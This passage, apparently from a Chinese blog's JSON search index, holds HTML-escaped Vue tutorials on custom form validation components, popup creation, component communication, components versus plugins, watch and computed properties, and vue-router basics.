KInput&#125;,   data() &#123;   return &#123;      model: &#123; username: &quot;tom&quot;, password: &quot;&quot; &#125;,    &#125;;   &#125;&#125;;&lt;/script&gt;\n\n\n实现KFormItem\n\n创建components&#x2F;form&#x2F;KFormItem.vue\n&lt;template&gt;  &lt;div&gt;    &lt;!-- label标签 --&gt;    &lt;label v-if=&quot;label&quot;&gt;&#123;&#123;label&#125;&#125;&lt;/label&gt;    &lt;!-- 容器，放插槽 --&gt;    &lt;slot&gt;&lt;/slot&gt;    &lt;!-- 错误信息展示 --&gt;    &lt;p v-if=&quot;error&quot; class=&quot;error&quot;&gt;&#123;&#123;error&#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Schema from &#x27;async-validator&#x27;  export default &#123;    inject: [&#x27;form&#x27;],    data() &#123;      return &#123;        error: &#x27;&#x27;      &#125;    &#125;,    props: &#123;      label: &#123;        type: String,        default: &#x27;&#x27;      &#125;,      prop: &#123;        type: String,        default: &#x27;&#x27;      &#125;    &#125;,    mounted () &#123;      // 监听校验事件      this.$on(&#x27;validate&#x27;, () =&gt; &#123;        this.validate()      &#125;)    &#125;,    methods: &#123;      validate() &#123;        // 执行校验        // 1.获取值和校验规则        const rules = this.form.rules[this.prop]        const value = this.form.model[this.prop]        // 2.执行校验：使用官方也使用的async-validator        // 创建描述对象        const descriptor = &#123;[this.prop]:rules&#125;        // 创建校验器        const validator = new Schema(descriptor)        // 执行校验        return validator.validate(&#123;[this.prop]:value&#125;, errors =&gt; &#123;          // 如果errors存在，则说明校验失败          if (errors) &#123;            this.error = errors[0].message          &#125; else &#123;            this.error = &#x27;&#x27;          &#125;        &#125;)      &#125;    &#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;.error&#123;  color: red&#125;&lt;/style&gt;\n\n\n使用KFormItem\n\ncomponents&#x2F;form&#x2F;index.vue，添加基础代码:\n&lt;template&gt;  &lt;div&gt;&lt;h3&gt;KForm表单&lt;/h3&gt;&lt;hr&gt;&lt;k-form-item label=&quot;用户名&quot; prop=&quot;username&quot;&gt;&lt;k-input v-model=&quot;model.username&quot;&gt;&lt;/k-input&gt; &lt;/k-form-item&gt;&lt;k-form-item label=&quot;确认密码&quot; prop=&quot;password&quot;&gt;&lt;k-input type=&quot;password&quot; v-model=&quot;model.password&quot;&gt;&lt;/k-input&gt;&lt;/k-form-item&gt; &lt;/div&gt;&lt;/template&gt;\n\n\n实现KForm\n\n&lt;template&gt;  &lt;div&gt;    &lt;!-- 容器：存放所有表单项 --&gt;    &lt;!-- 存储值载体：保存大家数据和校验规则 --&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;// 我们平时写的组件是一个组件配置对象export default &#123;  provide() &#123;    return &#123;      // 直接把当前组件实例传递下去      // 传递下去的对象是响应式的则还可以响应式      form: this    &#125;;  &#125;,  props: &#123;    // 数据模型    model: &#123;      type: Object,      required: true    &#125;,    rules: Object  &#125;,  methods: &#123;    validate(cb) &#123;      // 遍历肚子里面的所有FormItem，执行他们的validate方法      // 全部通过才算通过      // tasks是校验结果的Promise组成的数组      const tasks = this.$children        .filter(item =&gt; item.prop)        .map(item =&gt; item.validate());      // 统一判断      Promise.all(tasks)        .then(() =&gt; cb(true))        .catch(() =&gt; cb(false));    &#125;  &#125;&#125;;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;\n\n\n使用KForm\n\ncomponents&#x2F;form&#x2F;index.vue，添加基础代码:\n&lt; template &gt; &lt;div &gt; &lt;h3 &gt; KForm表单 &lt; /h3&gt;&lt;hr&gt;&lt;k-form :model=&quot;model&quot; :rules=&quot;rules&quot; ref=&quot;loginForm&quot;&gt;...&lt;/k - form &gt; &lt;/div&gt;&lt;/template &gt; &lt;script &gt; import KForm from &quot;./KForm&quot;;export default &#123;        components:        &#123;            KForm,        &#125;,        data() &#123;            return &#123;                rules: &#123;                    username: [&#123;                        required: true,                        message: &quot;请输入用户名&quot;                    &#125;],                    password: [&#123;                        required: true,                        message: &quot;请输入密码&quot;                    &#125;]                &#125;            &#125;;        &#125;,        methods: &#123;            submitForm() &#123;                this.$refs[&#x27;loginForm&#x27;].validate(valid = &gt;&#123;                    if (valid) &#123;                        alert(&quot;请求登录!&quot;);                    &#125; else &#123;                        alert(&quot;校验失败!&quot;);                    &#125;                &#125;);            &#125;        &#125;    &#125;; &lt; /script&gt;/\n\n\n数据校验\n\nInput通知校验\nonInput(e) &#123; // ...    // $parent指FormItem    this.$parent.$emit(&#x27;validate&#x27;);&#125;\n\nFormItem监听校验通知，获取规则并执行校验\ninject: [&#x27;form&#x27;],// 注入 mounted()&#123;// 监听校验事件this.$on(&#x27;validate&#x27;, () = &gt;&#123;    this.validate()&#125;)&#125;,methods: &#123;    validate() &#123;        // 获取对应FormItem校验规则 console.log(this.form.rules[this.prop]);    &#125;&#125;,import Schema from &quot;async-validator&quot;;validate() &#123;    // 获取对应FormItem校验规则    const rules = this.form.rules[this.prop];    // 获取校验值    const value = this.form.model[this.prop];    // 校验    const schema = new Schema(descriptor);    // 返回Promise，没有触发catch就说明验证通过    return schema.validate(&#123; [this.prop] : value    &#125;,    errors = &gt;&#123;        if (errors) &#123;            // 将错误信息显示            this.error = errors[0].message;        &#125; else &#123;            // 校验通过 this.error = &quot;&quot;;        &#125;    &#125;);&#125;\n\n表单全局验证，为Form提供validate方法\nvalidate(cb) &#123;    // 调用所有含有prop属性的子组件的validate方法并得到Promise数组 const tasks = this.$children    .filter(item = &gt;item.prop).map(item = &gt;item.validate());    // 所有任务必须全部成功才算校验通过，任一失败则校验失败    Promise.all(tasks).then(() = &gt;cb(true)).catch(() = &gt;cb(false))&#125;\n\n实现弹窗组件\n弹窗这类组件的特点是它们在当前vue实例之外独立存在，通常挂载于body;它们是通过JS动态创建的，不需要在任何组件中声明。常⻅使用姿势\n\nthis.$create(Notice, &#123;    title: &#x27;喊你来搬砖&#x27;,    message: &#x27;提示信息&#x27;,    duration: 1000&#125;).show();\n\ncreate函数\nimport Vue from &quot;vue&quot;;// 创建函数接收要创建组件定义function create(Component, props) &#123;    // 创建一个Vue新实例 const vm = new Vue(&#123;    render(h) &#123;        // render函数将传入组件配置对象转换为虚拟dom console.log(h(Component, &#123; props &#125;)); return h(Component, &#123; props &#125;);    &#125;&#125;).$mount(); //执行挂载函数，但未指定挂载目标，表示只执行初始化工作  // 将生成dom元素追加至  body document.body.appendChild(vm.$el);  // 给组件实例添加销毁方法  const comp = vm.$children[0];  comp.remove = () = &gt;&#123;      document.body.removeChild(vm.$el);      vm.$destroy();  &#125;;  return comp;&#125;// 暴露调用接口export default create\n\n\n另一种创建组件实例的方式: Vue.extend(Component)\n\nconst Ctor = Vue.extend(Component) const comp = new Ctor(&#123;    propsData: props&#125;) comp.$mount();document.body.appendChild(comp.$el) comp.remove = () = &gt;&#123;    // 移除dom document.body.removeChild(comp.$el) // 销毁组件    comp.$destroy();&#125;\n\n通知组件建通知组件，Notice.vue\n&lt;template&gt;  &lt;div class=&quot;box&quot; v-if=&quot;isShow&quot;&gt;    &lt;h3&gt;&#123;&#123;title&#125;&#125;&lt;/h3&gt;    &lt;p class=&quot;box-content&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  props: &#123;    title: &#123;      type: String,      default: &quot;&quot;    &#125;,    message: &#123;      type: String,      default: &quot;&quot;    &#125;,    duration: &#123;      type: Number,      default: 2000    &#125;  &#125;,  data() &#123;    return &#123;      isShow: false    &#125;;  &#125;,  methods: &#123;    show() &#123;      this.isShow = true;      setTimeout(this.hide, this.duration);    &#125;,    hide() &#123;      this.isShow = false;      this.remove();    &#125;  &#125;&#125;;&lt;/script&gt;&lt;style&gt;.box &#123;  position: fixed;  width: 100%;  top: 16px;  left: 0;  text-align: center;  pointer-events: none;  background-color: #fff;  border: grey 3px solid;  box-sizing: border-box;&#125;.box-content &#123;  width: 200px;  margin: 10px auto;  font-size: 14px;    padding: 8px 16px;  background: #fff;  border-radius: 3px;  margin-bottom: 8px;&#125;&lt;/style&gt;\n\n\n使用插件进一步封装便于使用，create.js\n\nimport Notice from &#x27;@/components/Notice.vue&#x27; //...export default &#123;  install(Vue) &#123;      Vue.prototype.$notice = function(options) &#123;          return create(Notice, options)      &#125;  &#125;&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-组件通信","url":"/2018/09/15/Vue/vue-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","content":"一、组件间通信的概念开始之前，我们把组件间通信这个词进行拆分\n\n组件\n通信\n\n都知道组件是vue最强大的功能之一，vue中每一个.vue我们都可以视之为一个组件通信指的是发送者通过某种媒体以某种格式来传递信息到收信者以达到某个目的。广义上，任何信息的交通都是通信组件间通信即指组件(.vue)通过某种方式来传递信息以达到某个目的举个栗子我们在使用UI框架中的table组件，可能会往table组件中传入某些数据，这个本质就形成了组件之间的通信\n二、组件间通信解决了什么通信的本质是信息同步，共享回到vue中，每个组件之间的都有独自的作用域，组件间的数据是无法共享的但实际开发工作中我们常常需要让组件之间共享数据，这也是组件通信的目的要让它们互相之间能进行通讯，这样才能构成一个有机的完整系统\n二、组件间通信的分类组件间通信的分类可以分成以下\n\n父子组件之间的通信\n兄弟组件之间的通信\n祖孙与后代组件之间的通信\n非关系组件间之间的通信\n\n关系图:\n\n三、组件间通信的方案整理vue中8种常规的通信方案\n\n通过 props 传递\n通过 $emit 触发自定义事件\n使用 ref\nEventBus\n$parent 或$root\nattrs 与 listeners\nProvide 与 Inject\nVuex\n\nprops传递数据\n\n适用场景：父组件传递数据给子组件\n子组件设置props属性，定义接收父组件传递过来的参数\n父组件在使用子组件标签中通过字面量来传递值\n\nChildren.vueprops:&#123;      // 字符串形式   name:String // 接收的类型参数      // 对象形式      age:&#123;            type:Number, // 接收的类型为数值          defaule:18,  // 默认值为18         require:true // age属性必须传递      &#125;  &#125;  \n\nFather.vue组件\n&lt;Children name=&quot;jack&quot; age=18 /&gt;  \n\n$emit 触发自定义事件\n适用场景：子组件传递数据给父组件\n子组件通过$emit触发自定义事件，$emit第二个参数为传递的数值\n父组件绑定监听器获取到子组件传递过来的参数\n\nChilfen.vuethis.$emit(&#x27;add&#x27;, good)  \n\nFather.vue&lt;Children @add=&quot;cartAdd($event)&quot; /&gt;  \n\nref\n父组件在使用子组件的时候设置ref\n父组件通过设置子组件ref来获取数据\n\n父组件\n&lt;Children ref=&quot;foo&quot; /&gt;    this.$refs.foo  // 获取子组件实例，通过子组件实例我们就能拿到对应的数据  \n\nEventBus\n使用场景：兄弟组件传值\n创建一个中央事件总线EventBus\n兄弟组件通过$emit触发自定义事件，$emit第二个参数为传递的数值\n另一个兄弟组件通过$on监听自定义事件\n\nBus.js// 创建一个中央时间总线类  class Bus &#123;    constructor() &#123;      this.callbacks = &#123;&#125;;   // 存放事件的名字    &#125;    $on(name, fn) &#123;      this.callbacks[name] = this.callbacks[name] || [];      this.callbacks[name].push(fn);    &#125;    $emit(name, args) &#123;      if (this.callbacks[name]) &#123;        this.callbacks[name].forEach((cb) =&gt; cb(args));      &#125;    &#125;  &#125;    // main.js  Vue.prototype.$bus = new Bus() // 将$bus挂载到vue实例的原型上  // 另一种方式  Vue.prototype.$bus = new Vue() // Vue已经实现了Bus的功能  \n\nChildren1.vuethis.$bus.$emit(&#x27;foo&#x27;)  \n\nChildren2.vuethis.$bus.$on(&#x27;foo&#x27;, this.handle)  \n\n$parent 或$ root\n通过共同祖辈$parent或者$root搭建通信桥连\n\n兄弟组件\nthis.$parent.on(&#x27;add&#x27;,this.add)\n\n另一个兄弟组件\nthis.$parent.emit(&#x27;add&#x27;)\n\n$attrs 与$ listeners\n适用场景：祖先传递数据给子孙\n设置批量向下传属性$attrs和 $listeners\n包含了父级作用域中不作为 prop 被识别 (且获取) 的特性绑定 ( class 和 style 除外)。\n可以通过 v-bind=&quot;$attrs&quot; 传⼊内部组件\n\n// 给Grandson隔代传值，communication/index.vue  &lt;Child2 msg=&quot;lalala&quot; @some-event=&quot;onSomeEvent&quot;&gt;&lt;/Child2&gt;    // Child2做展开  &lt;Grandson v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;&gt;&lt;/Grandson&gt;    // Grandson使⽤  &lt;div @click=&quot;$emit(&#x27;some-event&#x27;, &#x27;msg from grandson&#x27;)&quot;&gt;  &#123;&#123;msg&#125;&#125;  &lt;/div&gt;  \n\nprovide 与 inject\n在祖先组件定义provide属性，返回传递的值\n在后代组件通过inject接收组件传递过来的值\n\n祖先组件\nprovide()&#123;      return &#123;          foo:&#x27;foo&#x27;      &#125;  &#125;  \n\n后代组件\ninject:[&#x27;foo&#x27;] // 获取到祖先组件传递过来的值  \n\nvuex\n适用场景: 复杂关系的组件数据传递\nVuex作用相当于一个用来存储共享变量的容器 \nstate用来存放共享变量的地方\ngetter，可以增加一个getter派生状态，(相当于store中的计算属性），用来获得共享变量的值\nmutations用来存放修改state的方法。\nactions也是用来存放修改state的方法，不过action是在mutations的基础上进行。常用来做一些异步操作\n\n小结\n父子关系的组件数据传递选择 props 与 $emit进行传递，也可选择ref\n兄弟关系的组件数据传递可选择$bus，其次可以选择$parent进行传递\n祖先与后代组件数据传递可选择attrs与listeners或者 Provide与 Inject\n复杂关系的组件数据传递可以通过vuex存放共享的变量\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-组件和插件的区别","url":"/2018/09/10/Vue/vue-%E7%BB%84%E4%BB%B6%E5%92%8C%E6%8F%92%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、组件是什么回顾以前对组件的定义：\n组件就是把图形、非图形的各种逻辑均抽象为一个统一的概念（组件）来实现开发的模式，在Vue中每一个.vue文件都可以视为一个组件\n组件的优势\n\n降低整个系统的耦合度，在保持接口不变的情况下，我们可以替换不同的组件快速完成需求，例如输入框，可以替换为日历、时间、范围等组件作具体的实现\n调试方便，由于整个系统是通过组件组合起来的，在出现问题的时候，可以用排除法直接移除组件，或者根据报错的组件快速定位问题，之所以能够快速定位，是因为每个组件之间低耦合，职责单一，所以逻辑会比分析整个系统要简单\n提高可维护性，由于每个组件的职责单一，并且组件在系统中是被复用的，所以对代码进行优化可获得系统的整体升级\n\n二、插件是什么插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种：\n\n添加全局方法或者属性。如: vue-custom-element\n添加全局资源：指令&#x2F;过滤器&#x2F;过渡等。如 vue-touch\n通过全局混入来添加一些组件选项。如vue-router\n添加 Vue 实例方法，通过把它们添加到 Vue.prototype 上实现。\n一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如vue-router\n\n三、两者的区别两者的区别主要表现在以下几个方面：\n\n编写形式\n注册形式\n使用场景\n\n编写形式编写组件编写一个组件，可以有很多方式，我们最常见的就是vue单文件的这种格式，每一个.vue文件我们都可以看成是一个组件\nvue文件标准格式\n&lt;template&gt;&lt;/template&gt;&lt;script&gt;export default&#123;     ...&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt;\n\n我们还可以通过template属性来编写一个组件，如果组件内容多，我们可以在外部定义template组件内容，如果组件内容并不多，我们可直接写在template属性上\n&lt;template id=&quot;testComponent&quot;&gt;     // 组件显示的内容    &lt;div&gt;component!&lt;/div&gt;   &lt;/template&gt;Vue.component(&#x27;componentA&#x27;,&#123;     template: &#x27;#testComponent&#x27;      template: `&lt;div&gt;component&lt;/div&gt;`  // 组件内容少可以通过这种形式&#125;)\n\n编写插件vue插件的实现应该暴露一个 install 方法。这个方法的第一个参数是 Vue 构造器，第二个参数是一个可选的选项对象\nMyPlugin.install = function (Vue, options) &#123;  // 1. 添加全局方法或 property  Vue.myGlobalMethod = function () &#123;    // 逻辑...  &#125;  // 2. 添加全局资源  Vue.directive(&#x27;my-directive&#x27;, &#123;    bind (el, binding, vnode, oldVnode) &#123;      // 逻辑...    &#125;    ...  &#125;)  // 3. 注入组件选项  Vue.mixin(&#123;    created: function () &#123;      // 逻辑...    &#125;    ...  &#125;)  // 4. 添加实例方法  Vue.prototype.$myMethod = function (methodOptions) &#123;    // 逻辑...  &#125;&#125;\n\n注册形式组件注册vue组件注册主要分为全局注册与局部注册\n全局注册通过Vue.component方法，第一个参数为组件的名称，第二个参数为传入的配置项\nVue.component(&#x27;my-component-name&#x27;, &#123; /* ... */ &#125;)\n\n局部注册只需在用到的地方通过components属性注册一个组件\nconst component1 = &#123;...&#125; // 定义一个组件export default &#123;\tcomponents:&#123;\t\tcomponent1   // 局部注册\t&#125;&#125;\n\n插件注册插件的注册通过Vue.use()的方式进行注册（安装），第一个参数为插件的名字，第二个参数是可选择的配置项\nVue.use(插件名字,&#123; /* ... */&#125; )\n\n注意的是：\n注册插件的时候，需要在调用 new Vue() 启动应用之前完成\nVue.use会自动阻止多次注册相同插件，只会注册一次\n使用场景具体的其实在插件是什么章节已经表述了，这里在总结一下\n组件 (Component) 是用来构成你的 App 的业务模块，它的目标是 App.vue\n插件 (Plugin) 是用来增强你的技术栈的功能模块，它的目标是 Vue 本身\n简单来说，插件就是指对Vue的功能的增强或补充\n","categories":["框架"],"tags":["vue"]},{"title":"vue-计算属性与数据监听","url":"/2018/08/02/Vue/vue-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC/","content":"一、监听属性\n我们在工作中常常需要监听某一个属性值的变化，这个时候我们就需要用到了监听属性watch\n\n1.1 基础版监听\n场景如下：输入框输入你的年龄，如果年龄在0-15岁提示信息：你还是个小孩，如果年龄在 15-25岁，提示信息：你已经是个少年，如果年龄在25岁以上，提示信息：你已经长大了\n\n&lt;template&gt; &lt;div id=&quot;app&quot;&gt;  年齡：&lt;input type=&quot;number&quot; v-model=&quot;age&quot;&gt;&lt;br&gt;  提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123;  return &#123;   age: &quot;&quot;,   infoMsg:&quot;&quot;  &#125; &#125;, watch:&#123;  age:function(val,oldval)&#123;   if(val&gt;0 &amp;&amp; val&lt;15)&#123;    this.infoMsg=&quot;你还是个小孩&quot;   &#125;else if(val&gt;15 &amp;&amp; val&lt;25)&#123;    this.infoMsg=&quot;你已经是个少年&quot;   &#125;else&#123;    this.infoMsg=&quot;你已经长大了&quot;   &#125;  &#125; &#125;&#125;&lt;/script&gt;\n\n1.2 进阶版监听\n下面我们改变一下需求：基础规则不变，但是因为后台数据库的更改,我们需要提交一个这样的数据结构\n\ndata() &#123;  return &#123;   info: &#123;    age: &quot;&quot;   &#125;,   infoMsg: &quot;&quot;  &#125;; &#125;\n\n\n由于我们监听的是对象info中的属性age值的变化，所以我们需要使用到的是深度监听，具体代码如下\n\n&lt;template&gt; &lt;div id=&quot;app&quot;&gt;  年齡：&lt;input type=&quot;number&quot; v-model=&quot;info.age&quot;&gt;&lt;br&gt;  提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123;  return &#123;   info: &#123;    age: &quot;&quot;   &#125;,   infoMsg: &quot;&quot;  &#125;; &#125;, watch: &#123;  info: &#123;   handler: function(val, oldval) &#123;    var that = this;    if (val.age &gt; 0 &amp;&amp; val.age &lt; 15) &#123;     that.infoMsg = &quot;你还是个小孩&quot;;    &#125; else if (val.age &gt; 15 &amp;&amp; val.age &lt; 25) &#123;     that.infoMsg = &quot;你已经是个少年&quot;;    &#125; else &#123;     that.infoMsg = &quot;你已经长大了&quot;;    &#125;   &#125;,   deep: true  &#125; &#125;&#125;;&lt;/script&gt;\n\n\n这里的function不能使用箭头函数替代，如果使用箭头函数的话，this的指向会是全局\n你会注意到这里多加入一个属性是deep，它的含义表示是否开启深度监听，如果开启值为true，反之为false\n\n1.3 高级版监听&lt;template&gt; &lt;div id=&quot;app&quot;&gt;  年齡：&lt;input type=&quot;number&quot; v-model=&quot;info.age&quot;&gt;&lt;br&gt;  提示信息：&lt;span&gt;&#123;&#123;infoMsg&#125;&#125;&lt;/span&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123;  return &#123;   info: &#123;    age: &quot;&quot;,    name: &quot;&quot;,    hobit: &quot;&quot;   &#125;,   infoMsg: &quot;&quot;  &#125;; &#125;, computed: &#123;  ageval: function() &#123;   return this.info.age;  &#125; &#125;, watch: &#123;  ageval: &#123;   handler: function(val, oldval) &#123;    var that = this;    if (val &gt; 0 &amp;&amp; val &lt; 15) &#123;     that.infoMsg = &quot;你还是个小孩&quot;;    &#125; else if (val &gt; 15 &amp;&amp; val &lt; 25) &#123;     that.infoMsg = &quot;你已经是个少年&quot;;    &#125; else &#123;     that.infoMsg = &quot;你已经长大了&quot;;    &#125;   &#125;,   deep: true  &#125; &#125;&#125;;&lt;/script&gt;\n\n\n这次我们监听的是计算属性ageval，而计算属性返回的则是info对象中age的值，与第二次的代码进行比较我们可以发现两次代码中监听的一个是对象info，一个是info对象中age的值\n\n二、计算属性2.1 什么是计算属性\n模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让模板过重且难以维护。例如\n\n&lt;div id=&quot;example&quot;&gt;  &#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/div&gt;\n\n\n遇到复杂逻辑时应该使用Vue特带的计算属性computed来进行处理\n\n2.2 计算属性的用法\n在一个计算属性里可以完成各种复杂的逻辑，包括运算、函数调用等，只要最终返回一个结果就可以\n\n&lt;div id=&quot;example&quot;&gt;  &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt;  &lt;p&gt;Computed reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt;　&lt;!--我们把复杂处理放在了计算属性里面了--&gt;&lt;/div&gt;var vm = new Vue(&#123;    el: &#x27;#example&#x27;,    data: &#123;        message: &#x27;Hello&#x27;    &#125;,    computed: &#123;        reversedMessage: function () &#123;            // `this` 指向 vm 实例            return this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)        &#125;    &#125;&#125;);\n\n\n计算属性还可以依赖多个Vue 实例的数据，只要其中任一数据变化，计算属性就会重新执行，视图也会更新\n\n&lt;div id=&quot;app&quot;&gt;    &lt;button @click=&quot;add()&quot;&gt;补充货物1&lt;/button&gt;    &lt;div&gt;总价为：&#123;&#123;price&#125;&#125;&lt;/div&gt;&lt;/div&gt;var app = new Vue(&#123;               el: &#x27;#app&#x27;,    data: &#123;       package1: &#123;           count: 5,           price: 5       &#125;,       package2: &#123;           count: 10,           price: 10       &#125;    &#125;,    computed: &#123;     price: function()&#123;         return this.package1.count*this.package1.price+this.package2.count*this.package2.price　　//总价随着货物或价格的改变会重新计算     &#125;    &#125;,    methods: &#123;   //对象的方法        add: function()&#123;            this.package1.count++        &#125;    &#125;&#125;);\n\n\n每一个计算属性都包含一个getter 和一个setter ，我们上面的两个示例都是计算属性的默认用法， 只是利用了getter 来读取\n在你需要时，也可以提供一个setter 函数， 当手动修改计算属性的值就像修改一个普通数据那样时，就会触发setter 函数，执行一些自定义的操作，例如\n\nvar vm = new Vue(&#123;    el: &#x27;#demo&#x27;,    data: &#123;        firstName: &#x27;Foo&#x27;,        lastName: &#x27;Bar&#x27;    &#125;,    computed: &#123;        fullName: &#123;            // getter            get: function () &#123;                return this.firstName + &#x27; &#x27; + this.lastName            &#125;,            // setter            set: function (newValue) &#123;                var names = newValue.split(&#x27; &#x27;);                this.firstName = names[0];                this.lastName = names[names.length - 1];            &#125;        &#125;    &#125;&#125;);//现在再运行 vm.fullName = &#x27;John Doe&#x27; 时，setter 会被调用，vm.firstName 和 vm.lastName 也会相应地被更新。\n\n\n绝大多数情况下，我们只会用默认的getter 方法来读取一个计算属性，在业务中很少用到setter,所以在声明一个计算属性时，可以直接使用默认的写法，不必将getter 和setter都声明\n\n2.3 计算属性缓存\n除了使用计算属性外，我们也可以通过在表达式中调用方法来达到同样的效果\n\n&lt;div&gt;&#123;&#123;reverseTitle()&#125;&#125;&lt;/div&gt;// 在组件中methods: &#123;  reverseTitle: function () &#123;    return this.title.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)  &#125;&#125;\n\n\n我们可以将同一函数定义为一个方法而不是一个计算属性，两种方式的最终结果确实是完全相同的。只是一个使用reverseTitle()取值，一个使用reverseTitle取值。\n然而，不同的是计算属性是基于它们的依赖进行缓存的。计算属性只有在它的相关依赖发生改变时才会重新求值。\n这就意味着只要 title还没有发生改变，多次访问reverseTitle计算属性会立即返回之前的计算结果，而不必再次执行函数。\n\n&lt;div&gt;&#123;&#123;reverseTitle&#125;&#125;&lt;/div&gt;&lt;div&gt;&#123;&#123;reverseTitle1()&#125;&#125;&lt;/div&gt;&lt;button @click=&quot;add()&quot;&gt;补充货物1&lt;/button&gt;&lt;div&gt;总价为：&#123;&#123;price&#125;&#125;&lt;/div&gt;&lt;script&gt;    computed: &#123;      reverseTitle: function()&#123;          return this.title.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)　　//而使用计算属性，只要title没变，页面渲染是不会重新进这里来计算的，而是使用了缓存。      &#125;,      price: function()&#123;         return this.package1.count*this.package1.price+this.package2.count*this.package2.price      &#125;     &#125;,    methods: &#123;   //对象的方法    add: function()&#123;        this.package1.count++    &#125;,    reverseTitle1: function()&#123;        return this.title.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)　　//点击补充货物，也会进这个方法，再次计算。不是刷新，而是只要页面渲染，就会进方法里重新计算。    &#125;&lt;/script&gt;\n\n\n相比之下，每当触发重新渲染时，调用方法将总会再次执行函数。\n我们为什么需要缓存？假设我们有一个性能开销比较大的的计算属性 A，它需要遍历一个巨大的数组并做大量的计算。然后我们可能有其他的计算属性依赖于 A\n如果没有缓存，我们将不可避免的多次执行 A 的getter！如果你不希望有缓存，请用方法来替代\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-路由","url":"/2018/08/05/Vue/vue-%E8%B7%AF%E7%94%B1/","content":"一、路由基础介绍1.1 什么是前端路由\n路由是根据不同的url地址展示不同的内容或页面\n前端路由就是把不同的路由对应不同的内容或页面的任务交给前端来做，之前是通过服务端根据url的不同返回不同的页面实现的\n\n1.2 什么时候使用前端路由\n在单页面应用，大部分结构不变，只改变内容的使用\n\n1.3 前端路由优点、缺点\n优点\n：\n\n用户体验好，不需要每次都从服务器全部获取，快速展现给用户\n\n\n缺点\n：\n\n不利于SEO\n使用浏览器的前进，后退键的时候会重新发送请求，没有合理的利用缓存\n单页面无法记住之前滚动的位置，无法再前进，后退的时候记住滚动的位置\n\n\n\n二、vue-router用来构建SPA2.1 开始\n在你的文件夹下的 src 文件夹下的 main.js 文件内写入以下代码\n\nimport Vue from &#x27;vue&#x27;import VueRouter from &#x27;vue-router&#x27;Vue.use(VueRouter)\n\n\n\nvue-router其实就是对history的封装\n地址后面跟#其实就是用了hash\n\n\n&lt;div id=&quot;box&quot;&gt; &lt;/div&gt;&lt;!--定义模版--&gt;&lt;template id=&quot;a&quot;&gt;    &lt;div&gt;        第一个router    &lt;/div&gt;&lt;/template&gt;&lt;template id=&quot;b&quot;&gt;    &lt;div&gt;        第二个router    &lt;/div&gt;&lt;/template&gt;var routes = [    &#123;        path:&quot;/one&quot;,        component:&#123;template:&quot;#a&quot;&#125;    &#125;,    &#123;        path:&quot;/two&quot;,        component:&#123;template:&quot;#b&quot;&#125;    &#125;,];// 定义路由组件var router = new VueRouter(&#123;    routes&#125;);// 定义路由new Vue(&#123;    el:&quot;#box&quot;,    router&#125;);// 创建和挂载实例&lt;div id=&quot;box&quot;&gt;     &lt;router-link to=&quot;/one&quot;&gt;One&lt;/router-link&gt;    &lt;router-link to=&quot;/two&quot;&gt;Two&lt;/router-link&gt;    &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;\n\n\n&lt; router-link &gt; 默认会被渲染成一个 &#96;&#96; 标签 to=&quot;&quot;为我们定义的路由\n\n&lt; router-view &gt; 路由匹配到的组件将渲染在这里\n\n在new Router中指定mode为history即可去掉#，这样加载更加逼真符合预期\n\n\nnew Router(&#123;    mode: &quot;history&quot;,    routes: []&#125;)//router-link跳转标签 当a标签使用，to必须是一个绝对地址&lt;router-link to=&quot;/goods/title&quot;&gt;&lt;/router-link&gt;//或者this.$router.push(&#123;path:&quot;&quot;&#125;)// 组件的渲染 配合router—link使用&lt;router-view&gt;&lt;/router-view&gt;\n\n2.2 动态路由匹配\n通过变化的地址去加载信息\n\n\n\n\n模式\n匹配路径\n$route.params\n\n\n\n/user/:username\n/user/poetries\n&#123;username:&quot;poetries&quot;&#125;\n\n\n/user/:username/post/:post_id\n/user/poetries/post/123\n&#123;username:&quot;evan&quot;,post_id:123&#125;\n\n\n\n应用场景\n商城的详情页，要变换商品的id，根据商品的id去查对应商品的信息\n\n\n\n2.3 嵌套路由\n什么是嵌套路由\n路由嵌套路由\n\n\n\nnew Router(&#123;    mode: &quot;history&quot;,    routes: [        &#123;            path:&quot;/goods&quot;,             name: &quot;GoodsList&quot;,            component:GoodsList,            children: [ // 定义子组件               &#123;                   path:&quot;title&quot;,//最后形式/goods/title                   name:&quot;title&quot;,                   component:Title               &#125;            ]        &#125;    ]&#125;)\n\n2.4 编程式路由\n通过js来实现页面的跳转\n\n\n通过push名字就可以实现页面的跳转\n\n// 方式一this.$router.push(&quot;name&quot;) //name /cart// 方式二 this.$router.push(&#123;path:&quot;name&quot;&#125;)// 方式三 